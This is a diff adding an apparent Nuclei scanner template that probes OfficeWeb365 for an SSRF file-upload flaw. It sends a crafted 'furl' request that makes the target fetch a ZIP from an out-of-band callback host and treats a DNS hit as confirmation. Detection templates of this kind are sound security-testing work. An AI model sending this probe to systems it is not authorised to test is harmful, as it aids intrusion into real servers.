@@ -1,0 +1,23 @@
+id: OfficeWeb365-furl-SSRF-upload
+info:
+  name: OfficeWeb365-furl-SSRF-upload
+  author: apple
+  severity: critical
+  description: OfficeWeb365 furl SSRF 文件上传漏洞.
+  reference:
+    - http://wiki.fofamini.com/2023hw/OfficeWeb365%20%20furl%20SSRF%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        GET /?furl=http://{{interactsh-url}}/1.zip HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
